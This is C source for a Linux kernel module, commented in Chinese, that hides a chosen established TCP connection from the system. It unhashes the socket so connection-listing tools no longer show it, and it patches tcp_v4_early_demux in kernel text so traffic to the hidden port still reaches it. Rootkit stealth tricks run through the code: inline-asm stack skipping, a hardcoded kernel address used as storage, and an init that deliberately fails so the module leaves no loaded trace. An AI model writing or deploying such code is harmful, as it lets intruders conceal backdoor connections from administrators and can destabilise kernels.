// hide_connection.c
#include <linux/module.h>
#include <net/tcp.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/cpu.h>
/* 
 * version 1.0
 * 缺点：
 *	1. 仅仅可以藏一个sock，后续可以增加一个新的藏污纳垢专有hlist，同样可以见缝插针
 *	2. 仅仅支持目标端口匹配，即stub_func_tcp4_demux仅仅根据目标端口过滤
 * 但这一切都是为了简单！简单！简单！
 */

char *stub = NULL;

// 用于立即数替换
#define	ROOM_MAGIC	0x1122334455667788
#define	PORT_MAGIC	0x3412

// hook住tcp_v4_early_demux后执行该函数
void stub_func_tcp4_demux(struct sk_buff *skb)
{
	struct iphdr *iph;
    struct tcphdr *th;
	struct sock *sk;

	if (skb->pkt_type != PACKET_HOST)
		return;

	if (!pskb_may_pull(skb, skb_transport_offset(skb) + sizeof(struct tcphdr)))
		return;

	iph = ip_hdr(skb);
	th = tcp_hdr(skb);

	if (th->doff < sizeof(struct tcphdr) / 4)
		return;

	// PORT_MAGIC将会被目标端口所替换
	if (ntohs(th->dest) == PORT_MAGIC) {
		// ROOM_MAGIC将会被存放sock结构体的内存地址所替换，一个指针即可。
		struct sock **psk = (struct sock **)ROOM_MAGIC;
		sk = *psk; // 取出被藏匿的sock结构体地址

		atomic_inc_not_zero(&sk->sk_refcnt);
		skb->sk = sk;
		skb->destructor = sock_edemux;
		if (sk->sk_state != TCP_TIME_WAIT) {
			struct dst_entry *dst = sk->sk_rx_dst;

			if (dst)
				dst = dst_check(dst, 0);
			if (dst &&
				inet_sk(sk)->rx_dst_ifindex == skb->skb_iif)
				skb_dst_set_noref(skb, dst);
		}
		goto out;
	}
	return;
out:
	// 不再执行原始的tcp_v4_early_demux函数，skip掉它的堆栈。
	asm ("pop %rbx; pop %r12; pop %rbp; pop %r11; retq;");
}

#define FTRACE_SIZE   	5
#define POKE_OFFSET		0
#define POKE_LENGTH		5

void * *(*___vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, int node, const void *caller);
static void *(*_text_poke_smp)(void *addr, const void *opcode, size_t len);
static struct mutex *_text_mutex;

char *hide_tcp4_seq_show = NULL;
unsigned char jmp_call[POKE_LENGTH];

#define START _AC(0xffffffffa0000000, UL)
#define END   _AC(0xffffffffff000000, UL)

static int hide = 1;
module_param(hide, int, 0444);

static __be16 sport = 1234;
module_param(sport, ushort, 0444);

static __be16 dport = 1234;
module_param(dport, ushort, 0444);

static __be32 saddr = 0;
module_param(saddr, uint, 0444);

static __be32 daddr = 0;
module_param(daddr, uint, 0444);

static int ifindex = 0;
module_param(ifindex, int, 0444);

#define	ROOM_ADDR	0xffffffff815622dd

void restore_connection(void)
{
	struct sock *sk, **psk;

	psk = (struct sock **)ROOM_ADDR;
	sk = *psk;

	__inet_hash_nolisten(sk, NULL);
}

static int __init hideconn_init(void)
{
	s32 offset;
	char *_tcp4_early_demux, *stub_demux;
	unsigned long hide_psk[1];
	unsigned short aport[1];
	struct sock **hide_sk, *sk = NULL;
	unsigned long psk_addr = 0;
	int i;
	unsigned long *scan;
	unsigned short *sscan;

	_tcp4_early_demux = (void *)kallsyms_lookup_name("tcp_v4_early_demux");
	if (!_tcp4_early_demux) {
		return -1;
	}

	___vmalloc_node_range = (void *)kallsyms_lookup_name("__vmalloc_node_range");
	_text_poke_smp = (void *)kallsyms_lookup_name("text_poke_smp");
	_text_mutex = (void *)kallsyms_lookup_name("text_mutex");
	if (!___vmalloc_node_range || !_text_poke_smp || !_text_mutex) {
		return -1;
	}

	if (hide == 0) { // 恢复TCP连接，将其重新插入TCP ehash表
		restore_connection();

		offset = *(unsigned int *)&_tcp4_early_demux[1];
		stub = (char *)(offset + (unsigned long)_tcp4_early_demux + FTRACE_SIZE);

		get_online_cpus();
		mutex_lock(_text_mutex);
		_text_poke_smp(&_tcp4_early_demux[POKE_OFFSET], &stub[0], POKE_LENGTH);
		mutex_unlock(_text_mutex);
		put_online_cpus();

		vfree(stub);
		return -1;
	}

	stub_demux = (void *)___vmalloc_node_range(0x1ff, 1, START, END,
								GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
								-1, __builtin_return_address(0));

/*
// 仅仅藏匿一个socket
#define SIZE	1
	// 如果我们采用动态分配内存的方式，就必须想办法能找到它。
	// 呃...从stub_func_tcp4_demux的指令码里搜索是一个不错的选择！
	hide_sk = (struct sock **)___vmalloc_node_range(sizeof(char *)*SIZE, 1, START, END,
								GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
								-1, __builtin_return_address(0));
*/
	// 但为了更加trick，我还是选择藏污纳垢的方式来见缝插针！
	hide_sk = (struct sock **)ROOM_ADDR;
	if (!stub_demux || !hide_sk) {
		return -1;
	}

	// 根据参数传来的4元组来查找socket！
	sk = inet_lookup_established(&init_net, &tcp_hashinfo,
                            saddr, htons(sport), daddr, htons(dport), ifindex);
	if (!sk) {
		vfree(stub_demux);
		return -1;
	}

	*hide_sk = sk;
	psk_addr = (unsigned long)hide_sk;
	hide_psk[0] = psk_addr;
	stub = (void *)stub_func_tcp4_demux;

	// 扫描stub查找并替换“隐藏sock的内存地址”
	scan = (unsigned long *)stub;
	for (i = 0; i < 0x1ff; i++) {
		scan = (unsigned long *)&stub[i];
		if (*scan == ROOM_MAGIC)
			break;
	}
	_text_poke_smp(&stub[i], hide_psk, sizeof(hide_psk));

	// 扫描stub查找并替换目标端口
	sscan = (unsigned short *)stub;
	for (i = 0; i < 0x1ff; i++) {
		sscan = (unsigned short *)&stub[i];
		if (ntohs(*sscan) == PORT_MAGIC)
			break;
	}
	aport[0] = htons(dport);
	_text_poke_smp(&stub[i], aport, sizeof(aport));

	memcpy(stub_demux, stub_func_tcp4_demux, 0x1ff);
	stub = (void *)stub_demux;

	jmp_call[0] = 0xe8;

	offset = (s32)((long)stub - (long)_tcp4_early_demux - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&_tcp4_early_demux[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	// 将TCP连接从ehash摘除
	inet_unhash(sk);
	sock_put(sk);

	// 事了拂衣去，深藏身与名！
	return -1;
}

static void __exit hideconn_exit(void)
{
}

module_init(hideconn_init);
module_exit(hideconn_exit);
MODULE_LICENSE("GPL");
